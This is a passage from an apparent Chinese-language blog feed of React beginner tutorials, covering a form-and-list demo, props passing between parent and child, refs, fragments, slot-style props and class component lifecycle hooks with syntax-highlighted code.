<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">    state = &#123;</span><br><span class="line">        <span class="attr">data</span>: [],</span><br><span class="line">        <span class="attr">name</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">        <span class="attr">id</span>: <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// id或姓名发生改变</span></span><br><span class="line">    getChange = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 根据表单的 name 值来改变 key 值</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">            [e.<span class="property">target</span>.<span class="property">name</span>]:e.<span class="property">target</span>.<span class="property">value</span></span><br><span class="line">        &#125;); </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 提交</span></span><br><span class="line">    getSubmit = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        e.<span class="title function_">preventDefault</span>();</span><br><span class="line">        <span class="keyword">let</span> &#123;id,name&#125; = <span class="variable language_">this</span>.<span class="property">state</span>;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">            <span class="attr">data</span>:[</span><br><span class="line">                <span class="comment">//先解构，添加新数组中，同时拼接一个新对象</span></span><br><span class="line">                ...<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">data</span>, </span><br><span class="line">                &#123;id,name&#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除</span></span><br><span class="line">    del = <span class="function">(<span class="params">event,id</span>)=&gt;</span>&#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">setState</span>(&#123;</span><br><span class="line">            <span class="attr">data</span>:<span class="variable language_">this</span>.<span class="property">state</span>.<span class="property">data</span>.<span class="title function_">filter</span>(<span class="function"><span class="params">item</span> =&gt;</span> item.<span class="property">id</span> != id)</span><br><span class="line">        &#125;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">form</span> <span class="attr">onSubmit</span>=<span class="string">&#123;this.getSubmit&#125;</span> <span class="attr">methods</span>=<span class="string">&quot;post&quot;</span> &gt;</span></span></span><br><span class="line"><span class="language-xml">                    ID : <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;id&quot;</span> <span class="attr">onChange</span>=<span class="string">&#123;this.getChange&#125;/</span>&gt;</span> <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">                    姓名: <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;name&quot;</span> <span class="attr">onChange</span>=<span class="string">&#123;this.getChange&#125;/</span>&gt;</span><span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">br</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span>&gt;</span>提交<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    &#123;</span></span><br><span class="line"><span class="language-xml">                        this.state.data &amp;&amp; this.state.data.map((item,index)=&gt;&#123;</span></span><br><span class="line"><span class="language-xml">                            return (</span></span><br><span class="line"><span class="language-xml">                                <span class="tag">&lt;<span class="name">li</span> <span class="attr">key</span>=<span class="string">&#123;index&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                                    &#123;index+1&#125;、&#123;item.name&#125;  </span></span><br><span class="line"><span class="language-xml">                                    &#123;/* 传递参数 id */&#125;</span></span><br><span class="line"><span class="language-xml">                                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;(event)</span>=&gt;</span>this.del(event,item.id)&#125;&gt;</span></span><br><span class="line"><span class="language-xml">                                        删除</span></span><br><span class="line"><span class="language-xml">                                    <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                                <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                            )</span></span><br><span class="line"><span class="language-xml">                        &#125;)</span></span><br><span class="line"><span class="language-xml">                    &#125;</span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(</span><br><span class="line">    <span class="comment">// 引入组件</span></span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>,</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;app&quot;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>React快速入门（第二章）</title>
    <url>/React/react_02/</url>
    <content><![CDATA[<h2 id="组件传参">组件传参</h2>
<p>父组件通过自定义名称传递数据或方法，如：<mark class="hl-label green">name={this.state.name}</mark> ，<mark class="hl-label green">name={this.name}</mark> <br>
子组件接受数据或调用方法：<mark class="hl-label green">this.props.name</mark> </p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 父组件</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建和初始化class创建的对象的特殊方法--构造函数方法，不声明时会自动生成</span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// super(name)可以直接继承父类的属性和方法</span></span><br><span class="line">        <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 数据源</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">            <span class="attr">msg</span>: <span class="string">&quot;父组件数据&quot;</span>,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 绑定 this </span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">sayHello</span> = <span class="variable language_">this</span>.<span class="property">sayHello</span>.<span class="title function_">bind</span>(<span class="variable language_">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 父组件自定义方法</span></span><br><span class="line">    <span class="title function_">sayHello</span>(<span class="params">msg</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;子组件传递回来的参数:&quot;</span>,msg); <span class="comment">// 我是子组件</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                &#123;/* 传递数据和方法 */&#125;</span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">Child</span> <span class="attr">msg</span>=<span class="string">&#123;this.state.msg&#125;</span> <span class="attr">sayHello</span>=<span class="string">&#123;this.sayHello&#125;</span> /&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 子组件</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Child</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">h1</span>&gt;</span>父组件传递的数据:&#123;this.props.msg&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span>=&gt;</span>this.props.sayHello(&quot;我是子组件&quot;)&#125;&gt;</span></span><br><span class="line"><span class="language-xml">                    子组件调用父组件方法，并传值给父组件</span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>页面效果:<br>
<img src="/img/page/page07.png" alt=""></p>
<br/>
<h2 id="Refs">Refs</h2>
<p>适用情况：</p>
<blockquote>
<p>1.管理焦点，文本选择或媒体播放。<br>
2.触发强制动画。<br>
3.集成第三方 DOM 库。</p>
</blockquote>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">props</span>) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第一种写法</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">h1Ref</span> = <span class="title class_">React</span>.<span class="title function_">createRef</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二种写法</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">h2Ref</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取ref中DOM对象</span></span><br><span class="line">    getRefDom = <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ref1=&gt;&quot;</span>, <span class="variable language_">this</span>.<span class="property">h1Ref</span>.<span class="property">current</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;ref2=&gt;&quot;</span>, <span class="variable language_">this</span>.<span class="property">h2Ref</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">h2</span> <span class="attr">ref</span>=<span class="string">&#123;this.h1Ref&#125;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                    第一种获取refs中h2标签对象 </span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.getRefDom&#125;</span>&gt;</span>点击获取对象<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">h2</span> <span class="attr">ref</span>=<span class="string">&#123;el</span> =&gt;</span> this.h2Ref = el&#125;&gt;</span></span><br><span class="line"><span class="language-xml">                    第二种获取refs中h2标签对象</span></span><br><span class="line"><span class="language-xml">                    <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;this.getRefDom&#125;</span>&gt;</span>点击获取对象<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>,</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>打印效果：<br>
<img src="/img/page/page08.png" alt=""></p>
<br />
<h2 id="Fragments">Fragments</h2>
<p>React 中的一个常见模式是一个组件返回多个元素。Fragments 允许你将子列表分组，而无需向 DOM 添加额外节点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span>(</span><br><span class="line">        <span class="comment">// &lt;React.Fragment&gt;&lt;/React.Fragment&gt;可缩写为:&lt;&gt; &lt;/&gt; (不推荐缩写)</span></span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">h2</span>&gt;</span>Fragments<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">React.Fragment</span>&gt;</span></span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(</span><br><span class="line">    <span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>,</span><br><span class="line">    <span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<br />
<h2 id="插槽">插槽</h2>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">props</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">super</span>(props);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">            <span class="attr">lists</span>:[<span class="string">&quot;html&quot;</span>,<span class="string">&quot;css&quot;</span>,<span class="string">&quot;javascript&quot;</span>]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">                &#123;/*React 中插槽*/&#125;</span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">SScom</span> <span class="attr">dom</span>=<span class="string">&#123;</span>&lt;<span class="attr">AAcom</span> <span class="attr">name</span>=<span class="string">&quot;web前端&quot;</span> /&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">SScom</span> <span class="attr">dom</span>=<span class="string">&#123;</span>&lt;<span class="attr">a</span> <span class="attr">href</span>=<span class="string">&quot;http://www.baidu.com&quot;</span>&gt;</span>百度一下<span class="tag">&lt;/<span class="name">a</span>&gt;</span>&#125; /&gt;</span></span><br><span class="line"><span class="language-xml">                <span class="tag">&lt;<span class="name">SScom</span> <span class="attr">dom</span>=<span class="string">&#123;</span></span></span></span><br><span class="line"><span class="tag"><span class="language-xml">                    <span class="attr">this.state.lists.map</span>((<span class="attr">item</span>,<span class="attr">index</span>)=&gt;</span>&#123;</span></span><br><span class="line"><span class="language-xml">                        return (<span class="tag">&lt;<span class="name">AAcom</span> <span class="attr">name</span>=<span class="string">&#123;item&#125;</span> <span class="attr">key</span>=<span class="string">&#123;index&#125;</span> /&gt;</span> )</span></span><br><span class="line"><span class="language-xml">                    &#125;)</span></span><br><span class="line"><span class="language-xml">                &#125; /&gt;</span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 组件1</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">AAcom</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">            <span class="language-xml"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>组件 AAcom &#123;this.props.name&#125; <span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span> </span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//  组件2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SScom</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span>组件 SScom &#123;this.props.dom&#125; <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title class_">ReactDOM</span>.<span class="title function_">render</span>(</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">App</span> /&gt;</span></span>,</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&#x27;app&#x27;</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
      </tags>
  </entry>
  <entry>
    <title>React快速入门（第三章）</title>
    <url>/React/react_03/</url>
    <content><![CDATA[<p>组件的生命周期可分成三个状态：</p>
<ul>
<li>
<mark class="hl-label green">Mounting(挂载)</mark> ：已插入真实 DOM
</li>
<li>
<mark class="hl-label green">Updating(更新)</mark> ：正在被重新渲染
</li>
<li>
<mark class="hl-label green">Unmounting(卸载)</mark> ：已移出真实 DOM
</li>
</ul>
<br />
<p><img src="/img/page/page09.png" alt=""></p>
<br />
<table>
<thead>
<tr>
<th style="text-align:left">生命周期钩子</th>
<th style="text-align:left">描述</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">constructor</td>
<td style="text-align:left">组件挂载之前调用</td>
</tr>
<tr>
<td style="text-align:left">getDerivedStateFromProps</td>
<td style="text-align:left">组件渲染之前,当state数据更新时会再次触发</td>
</tr>
<tr>
<td style="text-align:left">render</td>
<td style="text-align:left">构建标签,把html渲染页面中</td>
</tr>
<tr>
<td style="text-align:left">componentDidMount</td>
<td style="text-align:left">页面挂载完成后</td>
</tr>
<tr>
<td style="text-align:left">shouldComponentUpdate</td>
<td style="text-align:left">更新数据到页面之前,必须返回值 true(允许更新),false(不允许更新</td>
</tr>
<tr>
<td style="text-align:left">getSnapshotBeforeUpdate</td>
<td style="text-align:left">更新后页面挂载最新数据,获取之前props和state数据。如果返回false,当前钩子不执行</td>
</tr>
<tr>
<td style="text-align:left">componentDidUpdate</td>
<td style="text-align:left">更新后最后钩子</td>
</tr>
<tr>
<td style="text-align:left">componentWillUnmount</td>
<td style="text-align:left">在组件卸载及销毁之前直接调用</td>
</tr>
</tbody>
</table>
<br />
<h2 id="挂载">挂载</h2>
<p>当组件实例被创建并插入 DOM 中时，其生命周期调用顺序如下：</p>
<ul>
<li>
<mark class="hl-label green">constructor()</mark> ：在 React 组件挂载之前，会调用它的构造函数。
</li>
<li>
<mark class="hl-label green">getDerivedStateFromProps()</mark> ：在调用 render 方法之前调用，并且在初始挂载及后续更新时都会被调用。当state数据更新时会再次触发。
</li>
<li>
<mark class="hl-label green">render()</mark> ：render() 方法是 class 组件中唯一必须实现的方法。当state数据更新时会再次触发。
</li>
<li>
<mark class="hl-label green">componentDidMount()</mark> ：在组件挂载后（插入 DOM 树中）立即调用。
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 组件挂载之前调用  </span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">props</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">super</span>(props);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 数据源</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&quot;组件&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1、constructor==&gt;组件挂载之前&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 组件渲染之前</span></span><br><span class="line">    <span class="comment">// 1.该方法返回一个对象用于更新 state</span></span><br><span class="line">    <span class="comment">// 2.如果返回 null 则不更新任何内容</span></span><br><span class="line">    <span class="comment">// 3.当state数据更新时会再次触发</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">getDerivedStateFromProps</span>(<span class="params">props,state</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;2、getDerivedStateFromProps==&gt;组件渲染之前&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;props==&gt;&quot;</span>,props);   <span class="comment">// &#123;&#125;</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;state==&gt;&quot;</span>,state);   <span class="comment">// &#123; name:&quot;组件&quot; &#125;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建标签,把html渲染页面中,当state数据更新时会再次触发</span></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;3、render==&gt;页面渲染&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">h1</span>&gt;</span>组件 -- &#123;this.props.name&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 页面挂载完成后</span></span><br><span class="line">    <span class="title function_">componentDidMount</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;4、componentDidMount==&gt;页面渲染完成&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<br />
<p><img src="/img/page/page10.png" alt=""></p>
<br />
<h2 id="更新">更新</h2>
<p>每当组件的 state 或 props 发生变化时，组件就会更新。<br>
当组件的 props 或 state 发生变化时会触发更新。</p>
<ul>
<li>
<mark class="hl-label green">shouldComponentUpdate()</mark> ：当 props 或 state 发生变化时，shouldComponentUpdate() 会在渲染执行之前被调用。
</li>
<li>
<mark class="hl-label green">getSnapshotBeforeUpdate()</mark> ：在最近一次渲染输出（提交到 DOM 节点）之前调用。
</li>
<li>
<mark class="hl-label green">componentDidUpdate()</mark> ：在更新后会被立即调用。
</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">App</span> <span class="keyword">extends</span> <span class="title class_ inherited__">React.Component</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 组件挂载之前调用  </span></span><br><span class="line">    <span class="title function_">constructor</span>(<span class="params">props</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">super</span>(props);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 数据源</span></span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">state</span> = &#123;</span><br><span class="line">            <span class="attr">name</span>:<span class="string">&quot;组件&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;1、constructor==&gt;组件挂载之前&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 当state数据更新时会再次触发</span></span><br><span class="line">    <span class="keyword">static</span> <span class="title function_">getDerivedStateFromProps</span>(<span class="params">props,state</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;2、getDerivedStateFromProps&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;props==&gt;&quot;</span>,props);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;state==&gt;&quot;</span>,state);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>; </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 构建标签,把html渲染页面中,当state数据更新时会再次触发</span></span><br><span class="line">    <span class="title function_">render</span>(<span class="params"></span>)&#123;</span><br><span class="line">         <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;3、render==&gt;页面渲染&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> (</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">div</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">            <span class="tag">&lt;<span class="name">button</span> <span class="attr">onClick</span>=<span class="string">&#123;()</span>=&gt;</span>&#123;this.setState(&#123;name:&quot;更新&quot;&#125;)&#125;&#125;&gt;更新数据<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span></span><br><span class="line">        )</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新数据到页面之前执行钩子 (首次页面不加载)，必须返回值 true(允许更新),false(不允许更新)</span></span><br><span class="line">    <span class="title function_">shouldComponentUpdate</span>(<span class="params">props,state</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;4、shouldComponentUpdate==&gt;页面更新&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;props==&gt;&quot;</span>,props);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;state==&gt;&quot;</span>,state);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新后页面挂载最新数据,获取之前props和state数据。如果返回false,当前钩子不执行</span></span><br><span class="line">    <span class="title function_">getSnapshotBeforeUpdate</span>(<span class="params">prevProps, prevState</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;5、getSnapshotBeforeUpdate==&gt;更新后页面挂载最新数据&quot;</span>)</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;prevProps==&gt;&quot;</span>,prevProps);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;prevState==&gt;&quot;</span>,prevState);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 更新后最后钩子</span></span><br><span class="line">    <span class="title function_">componentDidUpdate</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="variable 